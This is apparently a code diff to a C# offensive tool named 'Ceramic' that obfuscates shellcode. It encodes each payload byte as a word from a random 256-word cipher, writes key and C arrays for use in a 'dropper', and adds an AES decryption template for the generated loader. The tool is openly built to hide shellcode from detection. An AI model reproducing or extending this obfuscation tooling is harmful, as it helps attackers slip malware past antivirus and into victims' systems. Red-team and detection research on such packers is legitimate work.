@@ -29,6 +29,19 @@ namespace Ceramic
                 return new string(Enumerable.Repeat(chars, GetRandomInt(10)).Select(s => s[random.Next(s.Length)]).ToArray());
             }
         }
+        public static string RandomStringAlpha(int length = 0)
+        {
+            const string chars = "AABCDEEFGHIIJKLMNOOPQRSTUUVWXYyZqwertyuaeiouyiopasdfghjklzxcvbnm";
+
+            if (length > 0)
+            {
+                return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
+            }
+            else
+            {
+                return new string(Enumerable.Repeat(chars, GetRandomInt(10)).Select(s => s[random.Next(s.Length)]).ToArray());
+            }
+        }
         public static string RandomSpecialChars(int length = 0)
         {
             const string chars = "!@#$%^&*()_+=-{}][|`~";
@@ -153,59 +166,78 @@ namespace Ceramic
 
         public static byte[] AddtToEnd(byte[] first, byte[] second)
         {
-            byte[] bytes = new byte[first.Length + second.Length];
-            //Console.WriteLine(first[first.Length - 3] + " "+ first[first.Length - 2] + " " + first[first.Length - 1]);
-            //Console.WriteLine(second[second.Length - 3] + " " + second[second.Length - 2] + " " + second[second.Length - 1]);
-
-            Buffer.BlockCopy(first, 0, bytes, 0, first.Length);
-            Buffer.BlockCopy(second, 0, bytes, first.Length, second.Length);
-
-            //Console.WriteLine(bytes[bytes.Length - 3] + " " + bytes[bytes.Length - 2] + " " + bytes[bytes.Length - 1]);
-            return bytes;
+            return second.Concat(first).ToArray();
         }
 
         public static byte[] AddtToFront(byte[] first, byte[] second)
         {
-            byte[] bytes = new byte[second.Length + first.Length];
-            //Console.WriteLine(first[0] + " " + first[1] + " " + first[2]);
-            //Console.WriteLine(second[0] + " " + second[1] + " " + second[2]);
-
-            Buffer.BlockCopy(second, 0, bytes, 0, second.Length);
-            Buffer.BlockCopy(first, 0, bytes, second.Length, first.Length);
-
-            //Console.WriteLine(bytes[0] + " " + bytes[1] + " " + bytes[2]);
-            return bytes;
+            return first.Concat(second).ToArray();
         }
 
-        public static string ConvertShellcodeToRandomWordsBasedOnByte(byte[] shellcode)
+        public static string ConvertShellcodeToRandomWordsBasedOnByte(byte[] shellcode, int wordlength = 20)
         {
-            Console.WriteLine("[*] Converting shellcode to randomwords that will represent byte values from 0-254 based on length of word.");
+            Console.WriteLine("[*] Creating the array to use to lookup shellcode.");
             string shellcodewWords="";
-            for (int i = 0; i < shellcode.Length; ++i)
+            string Carray = "{";
+            Dictionary<string, int> cipher = new Dictionary<string, int>(256);
+            for (int i = 0; i <= 255; ++i)
             {
-                if (i == shellcode.Length)
+                string thing = RandomStringAlpha(GetRandomInt(wordlength, 2));
+                while (cipher.ContainsKey(thing) == true)
                 {
-                    shellcodewWords += RandomString(Convert.ToInt32(shellcode[i]));
+                    thing = RandomStringAlpha(GetRandomInt(wordlength, 2));
+                }
+                cipher.Add(thing, i);
+            }
+            int x = 0;
+            string codedArray = "";
+            string c_CodeArray1 = "{";
+            foreach (KeyValuePair<string, int> kvp in cipher)
+            {
+                if (x == cipher.Count-1)
+                {
+                    codedArray += kvp.Key;
+                    c_CodeArray1 += "\"" + kvp.Key + "\"";
                 }
                 else
                 {
-                    shellcodewWords += RandomString(Convert.ToInt32(shellcode[i]))+",";
+                    codedArray += kvp.Key + ",";
+                    c_CodeArray1+= "\""+ kvp.Key + "\"" + ",";
+                }
+                ++x;
+            }
+            Console.WriteLine("[*] Writting the KeyArray.txt file that contains the array used/the key");
+            File.WriteAllText("KeyArray.txt", c_CodeArray1 + "}");
+            Console.WriteLine("[*] Using the newly created array to encode shellcode into strings.....this could be awhile (stageless is large)");
+            for (int i = 0; i <= shellcode.Length-1; ++i)
+            {
+                if (i == shellcode.Length-1)
+                {
+                    shellcodewWords += cipher.FirstOrDefault(x => x.Value == shellcode[i]).Key;
+                    Carray+= "\""+ cipher.FirstOrDefault(x => x.Value == shellcode[i]).Key+"\"";
+                }
+                else
+                {
+                    shellcodewWords += cipher.FirstOrDefault(x => x.Value == shellcode[i]).Key + ",";
+                    Carray+= "\"" + cipher.FirstOrDefault(x => x.Value == shellcode[i]).Key + "\"" + ",";
                 }
             }
+            Console.WriteLine("[*] Creating c code version of array of word that is the shellcode into C_codeArray.txt");
+            File.WriteAllText("C_codeArray.txt", Carray + "}");
             return shellcodewWords;
         }
 
-        public static string ConvertShellcodeToPreDefineRandomWordsBasedOnByte(byte[] shellcode)
+        public static string ConvertShellcodeToPreDefineRandomWordsBasedOnByte(byte[] shellcode, int wordlength=20)
         {
             Console.WriteLine("[*] Making Array of random words that will represent byte values from 0-254 based on location in array. Can be used to ref in you dropper for shellcode.");
             string codedArray = "";
-            Dictionary<string,int>cipher = new Dictionary<string,int> (255);
-            for (int i = 0; i < 255; ++i)
+            Dictionary<string,int>cipher = new Dictionary<string,int> (256);
+            for (int i = 0; i <= 255; ++i)
             {
-                string thing = RandomString(GetRandomInt(35, 2));
+                string thing = RandomStringAlpha(GetRandomInt(wordlength, 2));
                 while (cipher.ContainsKey(thing)==true)
                 {
-                    thing = RandomString(GetRandomInt(20, 5));
+                    thing = RandomStringAlpha(GetRandomInt(wordlength, 2));
                 }
                 cipher.Add(thing, i);
             }
@@ -225,6 +257,60 @@ namespace Ceramic
             return codedArray;
         }
 
+        public static string ByteArrayToHexString(byte[] ba)
+        {
+            StringBuilder hex = new StringBuilder(ba.Length * 2);
+            foreach (byte b in ba)
+                hex.AppendFormat("\\{0:x2}", b);
+            return hex.ToString();
+        }
+
+        public static string CSharpAESDecryptCode()
+        {
+            return @"        
+        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
+        {
+            // Check arguments.
+            if (cipherText == null || cipherText.Length <= 0)
+                throw new ArgumentNullException(\""cipherText\"");
+            if (Key == null || Key.Length <= 0)
+                throw new ArgumentNullException(\""Key\"");
+            if (IV == null || IV.Length <= 0)
+                throw new ArgumentNullException(\""IV\"");
+
+            // Declare the string used to hold
+            // the decrypted text.
+            string plaintext = null;
+
+            // Create an Aes object
+            // with the specified key and IV.
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Key;
+                aesAlg.IV = IV;
+
+                // Create a decryptor to perform the stream transform.
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                // Create the streams used for decryption.
+                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                        {
+
+                            // Read the decrypted bytes from the decrypting stream
+                            // and place them in a string.
+                            plaintext = srDecrypt.ReadToEnd();
+                        }
+                    }
+                }
+            }
+
+            return plaintext;
+        }";
+        }
     }
 }
 
